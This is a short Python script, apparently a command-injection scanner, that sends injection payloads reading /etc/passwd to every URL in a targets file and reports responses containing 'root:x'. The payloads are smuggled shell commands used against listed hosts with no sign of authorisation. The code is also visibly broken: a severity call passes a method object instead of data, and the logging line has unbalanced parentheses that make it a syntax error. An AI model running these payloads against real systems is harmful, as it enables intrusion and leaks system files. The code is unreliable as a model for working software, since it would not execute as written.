import requests
from utils.log_utils import log_to_sheet, classify_severity

INJECTION_PAYLOADS = [";cat /etc/passwd", "| cat /etc/passwd", "&& cat /etc/passwd"]

def load_targets(file_path="targets/targets.txt"):
    with open(file_path, "r") as f:
        return [line.strip() for line in f if line.strip()]

def test_command_injection(base_url):
    findings = []
    for payload in INJECTION_PAYLOADS:
        test_url = f"{base_url}?cmd={payload}"
        print(f"[+] Testiram: {test_url}")
        try:
            r = requests.get(test_url, timeout=5)
            if "root:x" in r.text:
                findings.append(test_url)
                print(f"[!] Moguća Command Injection: {test_url}")
        except Exception as e:
            print(f"[-] Greška: {e}")
    return findings

def run_command_injection_scan():
    print("[~] Pokrećem Command Injection test...")
    targets = load_targets()
    for url in targets:
        found = test_command_injection(url)
        if found:
            severity = classify_severity("\n".join)
            log_to_sheet(__file__, "\n".join(found)) + f' | Severity: {{severity}}')

if __name__ == "__main__":
    run_command_injection_scan()
